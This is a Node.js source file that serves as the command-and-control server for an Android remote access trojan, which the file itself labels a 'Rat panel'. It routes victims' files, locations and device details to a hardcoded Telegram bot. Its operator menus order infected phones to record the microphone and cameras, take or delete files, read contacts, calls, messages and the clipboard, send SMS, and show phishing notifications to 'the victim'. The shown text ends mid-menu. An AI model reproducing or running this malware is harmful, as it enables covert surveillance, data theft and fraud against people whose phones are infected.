const express = require('express');
const webSocket = require('ws');
const http = require('http')
const telegramBot = require('node-telegram-bot-api')
const uuid4 = require('uuid')
const multer = require('multer');
const bodyParser = require('body-parser')
const axios = require("axios");

const token = '7536436084:AAGpx7eJQsCwfggjwGUxWazyj-KXQWWXfvo'
const id = '7953841468'
const address = 'https://www.google.com'

const app = express();
const appServer = http.createServer(app);
const appSocket = new webSocket.Server({server: appServer});
const appBot = new telegramBot(token, {polling: true});
const appClients = new Map()

const upload = multer();
app.use(bodyParser.json());

let currentUuid = ''
let currentNumber = ''
let currentTitle = ''

app.get('/', function (req, res) {
    res.send('<h1 align="center">𝙎𝙚𝙧𝙫𝙚𝙧 𝙪𝙥𝙡𝙤𝙖𝙙𝙚𝙙 𝙨𝙪𝙘𝙘𝙚𝙨𝙨𝙛𝙪𝙡𝙡𝙮</h1>')
})

app.post("/uploadFile", upload.single('file'), (req, res) => {
    const name = req.file.originalname
    appBot.sendDocument(id, req.file.buffer, {
            caption: `°• 𝙈𝙚𝙨𝙨𝙖𝙜𝙚 𝙛𝙧𝙤𝙢 <b>${req.headers.model}</b> 𝙙𝙚𝙫𝙞𝙘𝙚`,
            parse_mode: "HTML"
        },
        {
            filename: name,
            contentType: 'application/txt',
        })
    res.send('')
})
app.post("/uploadText", (req, res) => {
    appBot.sendMessage(id, `°• 𝙈𝙚𝙨𝙨𝙖𝙜𝙚 𝙛𝙧𝙤𝙢 <b>${req.headers.model}</b> 𝙙𝙚𝙫𝙞𝙘𝙚\n\n` + req.body['text'], {parse_mode: "HTML"})
    res.send('')
})
app.post("/uploadLocation", (req, res) => {
    appBot.sendLocation(id, req.body['lat'], req.body['lon'])
    appBot.sendMessage(id, `°• 𝙇𝙤𝙘𝙖𝙩𝙞𝙤𝙣 𝙛𝙧𝙤𝙢 <b>${req.headers.model}</b> 𝙙𝙚𝙫𝙞𝙘𝙚`, {parse_mode: "HTML"})
    res.send('')
})
appSocket.on('connection', (ws, req) => {
    const uuid = uuid4.v4()
    const model = req.headers.model
    const battery = req.headers.battery
    const version = req.headers.version
    const brightness = req.headers.brightness
    const provider = req.headers.provider

    ws.uuid = uuid
    appClients.set(uuid, {
        model: model,
        battery: battery,
        version: version,
        brightness: brightness,
        provider: provider
    })
    appBot.sendMessage(id,
        `°• 𝙉𝙚𝙬 𝙙𝙚𝙫𝙞𝙘𝙚 𝙘𝙤𝙣𝙣𝙚𝙘𝙩𝙚𝙙\n\n` +
        `• ᴅᴇᴠɪᴄᴇ ᴍᴏᴅᴇʟ : <b>${model}</b>\n` +
        `• ʙᴀᴛᴛᴇʀʏ : <b>${battery}</b>\n` +
        `• ᴀɴᴅʀᴏɪᴅ ᴠᴇʀꜱɪᴏɴ : <b>${version}</b>\n` +
        `• ꜱᴄʀᴇᴇɴ ʙʀɪɢʜᴛɴᴇꜱꜱ : <b>${brightness}</b>\n` +
        `• ᴘʀᴏᴠɪᴅᴇʀ : <b>${provider}</b>`,
        {parse_mode: "HTML"}
    )
    ws.on('close', function () {
        appBot.sendMessage(id,
            `°• 𝘿𝙚𝙫𝙞𝙘𝙚 𝙙𝙞𝙨𝙘𝙤𝙣𝙣𝙚𝙘𝙩𝙚𝙙\n\n` +
            `• ᴅᴇᴠɪᴄᴇ ᴍᴏᴅᴇʟ : <b>${model}</b>\n` +
            `• ʙᴀᴛᴛᴇʀʏ : <b>${battery}</b>\n` +
            `• ᴀɴᴅʀᴏɪᴅ ᴠᴇʀꜱɪᴏɴ : <b>${version}</b>\n` +
            `• ꜱᴄʀᴇᴇɴ ʙʀɪɢʜᴛɴᴇꜱꜱ : <b>${brightness}</b>\n` +
            `• ᴘʀᴏᴠɪᴅᴇʀ : <b>${provider}</b>`,
            {parse_mode: "HTML"}
        )
        appClients.delete(ws.uuid)
    })
})
appBot.on('message', (message) => {
    const chatId = message.chat.id;
    if (message.reply_to_message) {
        if (message.reply_to_message.text.includes('°• 𝙋𝙡𝙚𝙖𝙨𝙚 𝙧𝙚𝙥𝙡𝙮 𝙩𝙝𝙚 𝙣𝙪𝙢𝙗𝙚𝙧 𝙩𝙤 𝙬𝙝𝙞𝙘𝙝 𝙮𝙤𝙪 𝙬𝙖𝙣𝙩 𝙩𝙤 𝙨𝙚𝙣𝙙 𝙩𝙝𝙚 𝙎𝙈𝙎')) {
            currentNumber = message.text
            appBot.sendMessage(id,
                '°• 𝙂𝙧𝙚𝙖𝙩, 𝙣𝙤𝙬 𝙚𝙣𝙩𝙚𝙧 𝙩𝙝𝙚 𝙢𝙚𝙨𝙨𝙖𝙜𝙚 𝙮𝙤𝙪 𝙬𝙖𝙣𝙩 𝙩𝙤 𝙨𝙚𝙣𝙙 𝙩𝙤 𝙩𝙝𝙞𝙨 𝙣𝙪𝙢𝙗𝙚𝙧\n\n' +
                '• ʙᴇ ᴄᴀʀᴇꜰᴜʟ ᴛʜᴀᴛ ᴛʜᴇ ᴍᴇꜱꜱᴀɢᴇ ᴡɪʟʟ ɴᴏᴛ ʙᴇ ꜱᴇɴᴛ ɪꜰ ᴛʜᴇ ɴᴜᴍʙᴇʀ ᴏꜰ ᴄʜᴀʀᴀᴄᴛᴇʀꜱ ɪɴ ʏᴏᴜʀ ᴍᴇꜱꜱᴀɢᴇ ɪꜱ ᴍᴏʀᴇ ᴛʜᴀɴ ᴀʟʟᴏᴡᴇᴅ',
                {reply_markup: {force_reply: true}}
            )
        }
        if (message.reply_to_message.text.includes('°• 𝙂𝙧𝙚𝙖𝙩, 𝙣𝙤𝙬 𝙚𝙣𝙩𝙚𝙧 𝙩𝙝𝙚 𝙢𝙚𝙨𝙨𝙖𝙜𝙚 𝙮𝙤𝙪 𝙬𝙖𝙣𝙩 𝙩𝙤 𝙨𝙚𝙣𝙙 𝙩𝙤 𝙩𝙝𝙞𝙨 𝙣𝙪𝙢𝙗𝙚𝙧')) {
            appSocket.clients.forEach(function each(ws) {
                if (ws.uuid == currentUuid) {
                    ws.send(`send_message:${currentNumber}/${message.text}`)
                }
            });
            currentNumber = ''
            currentUuid = ''
            appBot.sendMessage(id,
                '°• 𝙔𝙤𝙪𝙧 𝙧𝙚𝙦𝙪𝙚𝙨𝙩 𝙞𝙨 𝙤𝙣 𝙥𝙧𝙤𝙘𝙚𝙨𝙨\n\n' +
                '• ʏᴏᴜ ᴡɪʟʟ ʀᴇᴄᴇɪᴠᴇ ᴀ ʀᴇꜱᴘᴏɴꜱᴇ ɪɴ ᴛʜᴇ ɴᴇxᴛ ꜰᴇᴡ ᴍᴏᴍᴇɴᴛꜱ',
                {
                    parse_mode: "HTML",
                    "reply_markup": {
                        "keyboard": [["𝘾𝙤𝙣𝙣𝙚𝙘𝙩𝙚𝙙 𝙙𝙚𝙫𝙞𝙘𝙚𝙨"], ["𝙀𝙭𝙚𝙘𝙪𝙩𝙚 𝙘𝙤𝙢𝙢𝙖𝙣𝙙"]],
                        'resize_keyboard': true
                    }
                }
            )
        }
        if (message.reply_to_message.text.includes('°• 𝙀𝙣𝙩𝙚𝙧 𝙩𝙝𝙚 𝙢𝙚𝙨𝙨𝙖𝙜𝙚 𝙮𝙤𝙪 𝙬𝙖𝙣𝙩 𝙩𝙤 𝙨𝙚𝙣𝙙 𝙩𝙤 𝙖𝙡𝙡 𝙘𝙤𝙣𝙩𝙖𝙘𝙩𝙨')) {
            const message_to_all = message.text
            appSocket.clients.forEach(function each(ws) {
                if (ws.uuid == currentUuid) {
                    ws.send(`send_message_to_all:${message_to_all}`)
                }
            });
            currentUuid = ''
            appBot.sendMessage(id,
                '°• 𝙔𝙤𝙪𝙧 𝙧𝙚𝙦𝙪𝙚𝙨𝙩 𝙞𝙨 𝙤𝙣 𝙥𝙧𝙤𝙘𝙚𝙨𝙨\n\n' +
                '• ʏᴏᴜ ᴡɪʟʟ ʀᴇᴄᴇɪᴠᴇ ᴀ ʀᴇꜱᴘᴏɴꜱᴇ ɪɴ ᴛʜᴇ ɴᴇxᴛ ꜰᴇᴡ ᴍᴏᴍᴇɴᴛꜱ',
                {
                    parse_mode: "HTML",
                    "reply_markup": {
                        "keyboard": [["𝘾𝙤𝙣𝙣𝙚𝙘𝙩𝙚𝙙 𝙙𝙚𝙫𝙞𝙘𝙚𝙨"], ["𝙀𝙭𝙚𝙘𝙪𝙩𝙚 𝙘𝙤𝙢𝙢𝙖𝙣𝙙"]],
                        'resize_keyboard': true
                    }
                }
            )
        }
        if (message.reply_to_message.text.includes('°• 𝙀𝙣𝙩𝙚𝙧 𝙩𝙝𝙚 𝙥𝙖𝙩𝙝 𝙤𝙛 𝙩𝙝𝙚 𝙛𝙞𝙡𝙚 𝙮𝙤𝙪 𝙬𝙖𝙣𝙩 𝙩𝙤 𝙙𝙤𝙬𝙣𝙡𝙤𝙖𝙙')) {
            const path = message.text
            appSocket.clients.forEach(function each(ws) {
                if (ws.uuid == currentUuid) {
                    ws.send(`file:${path}`)
                }
            });
            currentUuid = ''
            appBot.sendMessage(id,
                '°• 𝙔𝙤𝙪𝙧 𝙧𝙚𝙦𝙪𝙚𝙨𝙩 𝙞𝙨 𝙤𝙣 𝙥𝙧𝙤𝙘𝙚𝙨𝙨\n\n' +
                '• ʏᴏᴜ ᴡɪʟʟ ʀᴇᴄᴇɪᴠᴇ ᴀ ʀᴇꜱᴘᴏɴꜱᴇ ɪɴ ᴛʜᴇ ɴᴇxᴛ ꜰᴇᴡ ᴍᴏᴍᴇɴᴛꜱ',
                {
                    parse_mode: "HTML",
                    "reply_markup": {
                        "keyboard": [["𝘾𝙤𝙣𝙣𝙚𝙘𝙩𝙚𝙙 𝙙𝙚𝙫𝙞𝙘𝙚𝙨"], ["𝙀𝙭𝙚𝙘𝙪𝙩𝙚 𝙘𝙤𝙢𝙢𝙖𝙣𝙙"]],
                        'resize_keyboard': true
                    }
                }
            )
        }
        if (message.reply_to_message.text.includes('°• 𝙀𝙣𝙩𝙚𝙧 𝙩𝙝𝙚 𝙥𝙖𝙩𝙝 𝙤𝙛 𝙩𝙝𝙚 𝙛𝙞𝙡𝙚 𝙮𝙤𝙪 𝙬𝙖𝙣𝙩 𝙩𝙤 𝙙𝙚𝙡𝙚𝙩𝙚')) {
            const path = message.text
            appSocket.clients.forEach(function each(ws) {
                if (ws.uuid == currentUuid) {
                    ws.send(`delete_file:${path}`)
                }
            });
            currentUuid = ''
            appBot.sendMessage(id,
                '°• 𝙔𝙤𝙪𝙧 𝙧𝙚𝙦𝙪𝙚𝙨𝙩 𝙞𝙨 𝙤𝙣 𝙥𝙧𝙤𝙘𝙚𝙨𝙨\n\n' +
                '• ʏᴏᴜ ᴡɪʟʟ ʀᴇᴄᴇɪᴠᴇ ᴀ ʀᴇꜱᴘᴏɴꜱᴇ ɪɴ ᴛʜᴇ ɴᴇxᴛ ꜰᴇᴡ ᴍᴏᴍᴇɴᴛꜱ',
                {
                    parse_mode: "HTML",
                    "reply_markup": {
                        "keyboard": [["𝘾𝙤𝙣𝙣𝙚𝙘𝙩𝙚𝙙 𝙙𝙚𝙫𝙞𝙘𝙚𝙨"], ["𝙀𝙭𝙚𝙘𝙪𝙩𝙚 𝙘𝙤𝙢𝙢𝙖𝙣𝙙"]],
                        'resize_keyboard': true
                    }
                }
            )
        }
        if (message.reply_to_message.text.includes('°• 𝙀𝙣𝙩𝙚𝙧 𝙝𝙤𝙬 𝙡𝙤𝙣𝙜 𝙮𝙤𝙪 𝙬𝙖𝙣𝙩 𝙩𝙝𝙚 𝙢𝙞𝙘𝙧𝙤𝙥𝙝𝙤𝙣𝙚 𝙩𝙤 𝙗𝙚 𝙧𝙚𝙘𝙤𝙧𝙙𝙚𝙙')) {
            const duration = message.text
            appSocket.clients.forEach(function each(ws) {
                if (ws.uuid == currentUuid) {
                    ws.send(`microphone:${duration}`)
                }
            });
            currentUuid = ''
            appBot.sendMessage(id,
                '°• 𝙔𝙤𝙪𝙧 𝙧𝙚𝙦𝙪𝙚𝙨𝙩 𝙞𝙨 𝙤𝙣 𝙥𝙧𝙤𝙘𝙚𝙨𝙨\n\n' +
                '• ʏᴏᴜ ᴡɪʟʟ ʀᴇᴄᴇɪᴠᴇ ᴀ ʀᴇꜱᴘᴏɴꜱᴇ ɪɴ ᴛʜᴇ ɴᴇxᴛ ꜰᴇᴡ ᴍᴏᴍᴇɴᴛꜱ',
                {
                    parse_mode: "HTML",
                    "reply_markup": {
                        "keyboard": [["𝘾𝙤𝙣𝙣𝙚𝙘𝙩𝙚𝙙 𝙙𝙚𝙫𝙞𝙘𝙚𝙨"], ["𝙀𝙭𝙚𝙘𝙪𝙩𝙚 𝙘𝙤𝙢𝙢𝙖𝙣𝙙"]],
                        'resize_keyboard': true
                    }
                }
            )
        }
        if (message.reply_to_message.text.includes('°• 𝙀𝙣𝙩𝙚𝙧 𝙝𝙤𝙬 𝙡𝙤𝙣𝙜 𝙮𝙤𝙪 𝙬𝙖𝙣𝙩 𝙩𝙝𝙚 𝙢𝙖𝙞𝙣 𝙘𝙖𝙢𝙚𝙧𝙖 𝙩𝙤 𝙗𝙚 𝙧𝙚𝙘𝙤𝙧𝙙𝙚𝙙')) {
            const duration = message.text
            appSocket.clients.forEach(function each(ws) {
                if (ws.uuid == currentUuid) {
                    ws.send(`rec_camera_main:${duration}`)
                }
            });
            currentUuid = ''
            appBot.sendMessage(id,
                '°• 𝙔𝙤𝙪𝙧 𝙧𝙚𝙦𝙪𝙚𝙨𝙩 𝙞𝙨 𝙤𝙣 𝙥𝙧𝙤𝙘𝙚𝙨𝙨\n\n' +
                '• ʏᴏᴜ ᴡɪʟʟ ʀᴇᴄᴇɪᴠᴇ ᴀ ʀᴇꜱᴘᴏɴꜱᴇ ɪɴ ᴛʜᴇ ɴᴇxᴛ ꜰᴇᴡ ᴍᴏᴍᴇɴᴛꜱ',
                {
                    parse_mode: "HTML",
                    "reply_markup": {
                        "keyboard": [["𝘾𝙤𝙣𝙣𝙚𝙘𝙩𝙚𝙙 𝙙𝙚𝙫𝙞𝙘𝙚𝙨"], ["𝙀𝙭𝙚𝙘𝙪𝙩𝙚 𝙘𝙤𝙢𝙢𝙖𝙣𝙙"]],
                        'resize_keyboard': true
                    }
                }
            )
        }
        if (message.reply_to_message.text.includes('°• 𝙀𝙣𝙩𝙚𝙧 𝙝𝙤𝙬 𝙡𝙤𝙣𝙜 𝙮𝙤𝙪 𝙬𝙖𝙣𝙩 𝙩𝙝𝙚 𝙨𝙚𝙡𝙛𝙞𝙚 𝙘𝙖𝙢𝙚𝙧𝙖 𝙩𝙤 𝙗𝙚 𝙧𝙚𝙘𝙤𝙧𝙙𝙚𝙙')) {
            const duration = message.text
            appSocket.clients.forEach(function each(ws) {
                if (ws.uuid == currentUuid) {
                    ws.send(`rec_camera_selfie:${duration}`)
                }
            });
            currentUuid = ''
            appBot.sendMessage(id,
                '°• 𝙔𝙤𝙪𝙧 𝙧𝙚𝙦𝙪𝙚𝙨𝙩 𝙞𝙨 𝙤𝙣 𝙥𝙧𝙤𝙘𝙚𝙨𝙨\n\n' +
                '• ʏᴏᴜ ᴡɪʟʟ ʀᴇᴄᴇɪᴠᴇ ᴀ ʀᴇꜱᴘᴏɴꜱᴇ ɪɴ ᴛʜᴇ ɴᴇxᴛ ꜰᴇᴡ ᴍᴏᴍᴇɴᴛꜱ',
                {
                    parse_mode: "HTML",
                    "reply_markup": {
                        "keyboard": [["𝘾𝙤𝙣𝙣𝙚𝙘𝙩𝙚𝙙 𝙙𝙚𝙫𝙞𝙘𝙚𝙨"], ["𝙀𝙭𝙚𝙘𝙪𝙩𝙚 𝙘𝙤𝙢𝙢𝙖𝙣𝙙"]],
                        'resize_keyboard': true
                    }
                }
            )
        }
        if (message.reply_to_message.text.includes('°• 𝙀𝙣𝙩𝙚𝙧 𝙩𝙝𝙚 𝙢𝙚𝙨𝙨𝙖𝙜𝙚 𝙩𝙝𝙖𝙩 𝙮𝙤𝙪 𝙬𝙖𝙣𝙩 𝙩𝙤 𝙖𝙥𝙥𝙚𝙖𝙧 𝙤𝙣 𝙩𝙝𝙚 𝙩𝙖𝙧𝙜𝙚𝙩 𝙙𝙚𝙫𝙞𝙘𝙚')) {
            const toastMessage = message.text
            appSocket.clients.forEach(function each(ws) {
                if (ws.uuid == currentUuid) {
                    ws.send(`toast:${toastMessage}`)
                }
            });
            currentUuid = ''
            appBot.sendMessage(id,
                '°• 𝙔𝙤𝙪𝙧 𝙧𝙚𝙦𝙪𝙚𝙨𝙩 𝙞𝙨 𝙤𝙣 𝙥𝙧𝙤𝙘𝙚𝙨𝙨\n\n' +
                '• ʏᴏᴜ ᴡɪʟʟ ʀᴇᴄᴇɪᴠᴇ ᴀ ʀᴇꜱᴘᴏɴꜱᴇ ɪɴ ᴛʜᴇ ɴᴇxᴛ ꜰᴇᴡ ᴍᴏᴍᴇɴᴛꜱ',
                {
                    parse_mode: "HTML",
                    "reply_markup": {
                        "keyboard": [["𝘾𝙤𝙣𝙣𝙚𝙘𝙩𝙚𝙙 𝙙𝙚𝙫𝙞𝙘𝙚𝙨"], ["𝙀𝙭𝙚𝙘𝙪𝙩𝙚 𝙘𝙤𝙢𝙢𝙖𝙣𝙙"]],
                        'resize_keyboard': true
                    }
                }
            )
        }
        if (message.reply_to_message.text.includes('°• 𝙀𝙣𝙩𝙚𝙧 𝙩𝙝𝙚 𝙢𝙚𝙨𝙨𝙖𝙜𝙚 𝙮𝙤𝙪 𝙬𝙖𝙣𝙩 𝙩𝙤 𝙖𝙥𝙥𝙚𝙖𝙧 𝙖𝙨 𝙣𝙤𝙩𝙞𝙛𝙞𝙘𝙖𝙩𝙞𝙤𝙣')) {
            const notificationMessage = message.text
            currentTitle = notificationMessage
            appBot.sendMessage(id,
                '°• 𝙂𝙧𝙚𝙖𝙩, 𝙣𝙤𝙬 𝙚𝙣𝙩𝙚𝙧 𝙩𝙝𝙚 𝙡𝙞𝙣𝙠 𝙮𝙤𝙪 𝙬𝙖𝙣𝙩 𝙩𝙤 𝙗𝙚 𝙤𝙥𝙚𝙣𝙚𝙙 𝙗𝙮 𝙩𝙝𝙚 𝙣𝙤𝙩𝙞𝙛𝙞𝙘𝙖𝙩𝙞𝙤𝙣\n\n' +
                '• ᴡʜᴇɴ ᴛʜᴇ ᴠɪᴄᴛɪᴍ ᴄʟɪᴄᴋꜱ ᴏɴ ᴛʜᴇ ɴᴏᴛɪꜰɪᴄᴀᴛɪᴏɴ, ᴛʜᴇ ʟɪɴᴋ ʏᴏᴜ ᴀʀᴇ ᴇɴᴛᴇʀɪɴɢ ᴡɪʟʟ ʙᴇ ᴏᴘᴇɴᴇᴅ',
                {reply_markup: {force_reply: true}}
            )
        }
        if (message.reply_to_message.text.includes('°• 𝙂𝙧𝙚𝙖𝙩, 𝙣𝙤𝙬 𝙚𝙣𝙩𝙚𝙧 𝙩𝙝𝙚 𝙡𝙞𝙣𝙠 𝙮𝙤𝙪 𝙬𝙖𝙣𝙩 𝙩𝙤 𝙗𝙚 𝙤𝙥𝙚𝙣𝙚𝙙 𝙗𝙮 𝙩𝙝𝙚 𝙣𝙤𝙩𝙞𝙛𝙞𝙘𝙖𝙩𝙞𝙤𝙣')) {
            const link = message.text
            appSocket.clients.forEach(function each(ws) {
                if (ws.uuid == currentUuid) {
                    ws.send(`show_notification:${currentTitle}/${link}`)
                }
            });
            currentUuid = ''
            appBot.sendMessage(id,
                '°• 𝙔𝙤𝙪𝙧 𝙧𝙚𝙦𝙪𝙚𝙨𝙩 𝙞𝙨 𝙤𝙣 𝙥𝙧𝙤𝙘𝙚𝙨𝙨\n\n' +
                '• ʏᴏᴜ ᴡɪʟʟ ʀᴇᴄᴇɪᴠᴇ ᴀ ʀᴇꜱᴘᴏɴꜱᴇ ɪɴ ᴛʜᴇ ɴᴇxᴛ ꜰᴇᴡ ᴍᴏᴍᴇɴᴛꜱ',
                {
                    parse_mode: "HTML",
                    "reply_markup": {
                        "keyboard": [["𝘾𝙤𝙣𝙣𝙚𝙘𝙩𝙚𝙙 𝙙𝙚𝙫𝙞𝙘𝙚𝙨"], ["𝙀𝙭𝙚𝙘𝙪𝙩𝙚 𝙘𝙤𝙢𝙢𝙖𝙣𝙙"]],
                        'resize_keyboard': true
                    }
                }
            )
        }
        if (message.reply_to_message.text.includes('°• 𝙀𝙣𝙩𝙚𝙧 𝙩𝙝𝙚 𝙖𝙪𝙙𝙞𝙤 𝙡𝙞𝙣𝙠 𝙮𝙤𝙪 𝙬𝙖𝙣𝙩 𝙩𝙤 𝙥𝙡𝙖𝙮')) {
            const audioLink = message.text
            appSocket.clients.forEach(function each(ws) {
                if (ws.uuid == currentUuid) {
                    ws.send(`play_audio:${audioLink}`)
                }
            });
            currentUuid = ''
            appBot.sendMessage(id,
                '°• 𝙔𝙤𝙪𝙧 𝙧𝙚𝙦𝙪𝙚𝙨𝙩 𝙞𝙨 𝙤𝙣 𝙥𝙧𝙤𝙘𝙚𝙨𝙨\n\n' +
                '• ʏᴏᴜ ᴡɪʟʟ ʀᴇᴄᴇɪᴠᴇ ᴀ ʀᴇꜱᴘᴏɴꜱᴇ ɪɴ ᴛʜᴇ ɴᴇxᴛ ꜰᴇᴡ ᴍᴏᴍᴇɴᴛꜱ',
                {
                    parse_mode: "HTML",
                    "reply_markup": {
                        "keyboard": [["𝘾𝙤𝙣𝙣𝙚𝙘𝙩𝙚𝙙 𝙙𝙚𝙫𝙞𝙘𝙚𝙨"], ["𝙀𝙭𝙚𝙘𝙪𝙩𝙚 𝙘𝙤𝙢𝙢𝙖𝙣𝙙"]],
                        'resize_keyboard': true
                    }
                }
            )
        }
    }
    if (id == chatId) {
        if (message.text == '/start') {
            appBot.sendMessage(id,
                '°• 𝙒𝙚𝙡𝙘𝙤𝙢𝙚 𝙩𝙤 𝙍𝙖𝙩 𝙥𝙖𝙣𝙚𝙡\n\n' +
                '• ɪꜰ ᴛʜᴇ ᴀᴘᴘʟɪᴄᴀᴛɪᴏɴ ɪꜱ ɪɴꜱᴛᴀʟʟᴇᴅ ᴏɴ ᴛʜᴇ ᴛᴀʀɢᴇᴛ ᴅᴇᴠɪᴄᴇ, ᴡᴀɪᴛ ꜰᴏʀ ᴛʜᴇ ᴄᴏɴɴᴇᴄᴛɪᴏɴ\n\n' +
                '• ᴡʜᴇɴ ʏᴏᴜ ʀᴇᴄᴇɪᴠᴇ ᴛʜᴇ ᴄᴏɴɴᴇᴄᴛɪᴏɴ ᴍᴇꜱꜱᴀɢᴇ, ɪᴛ ᴍᴇᴀɴꜱ ᴛʜᴀᴛ ᴛʜᴇ ᴛᴀʀɢᴇᴛ ᴅᴇᴠɪᴄᴇ ɪꜱ ᴄᴏɴɴᴇᴄᴛᴇᴅ ᴀɴᴅ ʀᴇᴀᴅʏ ᴛᴏ ʀᴇᴄᴇɪᴠᴇ ᴛʜᴇ ᴄᴏᴍᴍᴀɴᴅ\n\n' +
                '• ᴄʟɪᴄᴋ ᴏɴ ᴛʜᴇ ᴄᴏᴍᴍᴀɴᴅ ʙᴜᴛᴛᴏɴ ᴀɴᴅ ꜱᴇʟᴇᴄᴛ ᴛʜᴇ ᴅᴇꜱɪʀᴇᴅ ᴅᴇᴠɪᴄᴇ ᴛʜᴇɴ ꜱᴇʟᴇᴄᴛ ᴛʜᴇ ᴅᴇꜱɪʀᴇᴅ ᴄᴏᴍᴍᴀɴᴅ ᴀᴍᴏɴɢ ᴛʜᴇ ᴄᴏᴍᴍᴀɴᴅꜱ\n\n' +
                '• ɪꜰ ʏᴏᴜ ɢᴇᴛ ꜱᴛᴜᴄᴋ ꜱᴏᴍᴇᴡʜᴇʀᴇ ɪɴ ᴛʜᴇ ʙᴏᴛ, ꜱᴇɴᴅ /start ᴄᴏᴍᴍᴀɴᴅ',
                {
                    parse_mode: "HTML",
                    "reply_markup": {
                        "keyboard": [["𝘾𝙤𝙣𝙣𝙚𝙘𝙩𝙚𝙙 𝙙𝙚𝙫𝙞𝙘𝙚𝙨"], ["𝙀𝙭𝙚𝙘𝙪𝙩𝙚 𝙘𝙤𝙢𝙢𝙖𝙣𝙙"]],
                        'resize_keyboard': true
                    }
                }
            )
        }
        if (message.text == '𝘾𝙤𝙣𝙣𝙚𝙘𝙩𝙚𝙙 𝙙𝙚𝙫𝙞𝙘𝙚𝙨') {
            if (appClients.size == 0) {
                appBot.sendMessage(id,
                    '°• 𝙉𝙤 𝙘𝙤𝙣𝙣𝙚𝙘𝙩𝙞𝙣𝙜 𝙙𝙚𝙫𝙞𝙘𝙚𝙨 𝙖𝙫𝙖𝙞𝙡𝙖𝙗𝙡𝙚\n\n' +
                    '• ᴍᴀᴋᴇ ꜱᴜʀᴇ ᴛʜᴇ ᴀᴘᴘʟɪᴄᴀᴛɪᴏɴ ɪꜱ ɪɴꜱᴛᴀʟʟᴇᴅ ᴏɴ ᴛʜᴇ ᴛᴀʀɢᴇᴛ ᴅᴇᴠɪᴄᴇ'
                )
            } else {
                let text = '°• 𝙇𝙞𝙨𝙩 𝙤𝙛 𝙘𝙤𝙣𝙣𝙚𝙘𝙩𝙚𝙙 𝙙𝙚𝙫𝙞𝙘𝙚𝙨 :\n\n'
                appClients.forEach(function (value, key, map) {
                    text += `• ᴅᴇᴠɪᴄᴇ ᴍᴏᴅᴇʟ : <b>${value.model}</b>\n` +
                        `• ʙᴀᴛᴛᴇʀʏ : <b>${value.battery}</b>\n` +
                        `• ᴀɴᴅʀᴏɪᴅ ᴠᴇʀꜱɪᴏɴ : <b>${value.version}</b>\n` +
                        `• ꜱᴄʀᴇᴇɴ ʙʀɪɢʜᴛɴᴇꜱꜱ : <b>${value.brightness}</b>\n` +
                        `• ᴘʀᴏᴠɪᴅᴇʀ : <b>${value.provider}</b>\n\n`
                })
                appBot.sendMessage(id, text, {parse_mode: "HTML"})
            }
        }
        if (message.text == '𝙀𝙭𝙚𝙘𝙪𝙩𝙚 𝙘𝙤𝙢𝙢𝙖𝙣𝙙') {
            if (appClients.size == 0) {
                appBot.sendMessage(id,
                    '°• 𝙉𝙤 𝙘𝙤𝙣𝙣𝙚𝙘𝙩𝙞𝙣𝙜 𝙙𝙚𝙫𝙞𝙘𝙚𝙨 𝙖𝙫𝙖𝙞𝙡𝙖𝙗𝙡𝙚\n\n' +
                    '• ᴍᴀᴋᴇ ꜱᴜʀᴇ ᴛʜᴇ ᴀᴘᴘʟɪᴄᴀᴛɪᴏɴ ɪꜱ ɪɴꜱᴛᴀʟʟᴇᴅ ᴏɴ ᴛʜᴇ ᴛᴀʀɢᴇᴛ ᴅᴇᴠɪᴄᴇ'
                )
            } else {
                const deviceListKeyboard = []
                appClients.forEach(function (value, key, map) {
                    deviceListKeyboard.push([{
                        text: value.model,
                        callback_data: 'device:' + key
                    }])
                })
                appBot.sendMessage(id, '°• 𝙎𝙚𝙡𝙚𝙘𝙩 𝙙𝙚𝙫𝙞𝙘𝙚 𝙩𝙤 𝙚𝙭𝙚𝙘𝙪𝙩𝙚 𝙘𝙤𝙢𝙢𝙚𝙣𝙙', {
                    "reply_markup": {
                        "inline_keyboard": deviceListKeyboard,
                    },
                })
            }
        }
    } else {
        appBot.sendMessage(id, '°• 𝙋𝙚𝙧𝙢𝙞𝙨𝙨𝙞𝙤𝙣 𝙙𝙚𝙣𝙞𝙚𝙙')
    }
})
appBot.on("callback_query", (callbackQuery) => {
    const msg = callbackQuery.message;
    const data = callbackQuery.data
    const commend = data.split(':')[0]
    const uuid = data.split(':')[1]
    console.log(uuid)
    if (commend == 'device') {
        appBot.editMessageText(`°• 𝙎𝙚𝙡𝙚𝙘𝙩 𝙘𝙤𝙢𝙢𝙚𝙣𝙙 𝙛𝙤𝙧 𝙙𝙚𝙫𝙞𝙘𝙚 : <b>${appClients.get(data.split(':')[1]).model}</b>`, {
            width: 10000,
            chat_id: id,
            message_id: msg.message_id,
            reply_markup: {
                inline_keyboard: [
                    [
                        {text: '𝘼𝙥𝙥𝙨', callback_data: `apps:${uuid}`},
                        {text: '𝘿𝙚𝙫𝙞𝙘𝙚 𝙞𝙣𝙛𝙤', callback_data: `device_info:${uuid}`}
                    ],
                    [
                        {text: '𝙂𝙚𝙩 𝙛𝙞𝙡𝙚', callback_data: `file:${uuid}`},
                        {text: '𝘿𝙚𝙡𝙚𝙩𝙚 𝙛𝙞𝙡𝙚', callback_data: `delete_file:${uuid}`}
                    ],
                    [
                        {text: '𝘾𝙡𝙞𝙥𝙗𝙤𝙖𝙧𝙙', callback_data: `clipboard:${uuid}`},
                        {text: '𝙈𝙞𝙘𝙧𝙤𝙥𝙝𝙤𝙣𝙚', callback_data: `microphone:${uuid}`},
                    ],
                    [
                        {text: '𝙈𝙖𝙞𝙣 𝙘𝙖𝙢𝙚𝙧𝙖', callback_data: `camera_main:${uuid}`},
                        {text: '𝙎𝙚𝙡𝙛𝙞𝙚 𝙘𝙖𝙢𝙚𝙧𝙖', callback_data: `camera_selfie:${uuid}`}
                    ],
                    [
                        {text: '𝙇𝙤𝙘𝙖𝙩𝙞𝙤𝙣', callback_data: `location:${uuid}`},
                        {text: '𝙏𝙤𝙖𝙨𝙩', callback_data: `toast:${uuid}`}
                    ],
                    [
                        {text: '𝘾𝙖𝙡𝙡𝙨', callback_data: `calls:${uuid}`},
                        {text: '𝘾𝙤𝙣𝙩𝙖𝙘𝙩𝙨', callback_data: `contacts:${uuid}`}
                    ],
                    [
                        {text: '𝙑𝙞𝙗𝙧𝙖𝙩𝙚', callback_data: `vibrate:${uuid}`},
                        {text: '𝙎𝙝𝙤𝙬 𝙣𝙤𝙩𝙞𝙛𝙞𝙘𝙖𝙩𝙞𝙤𝙣', callback_data: `show_notification:${uuid}`}
                    ],
                    [
                        {text: '𝙈𝙚𝙨𝙨𝙖𝙜𝙚𝙨', callback_data: `messages:${uuid}`},
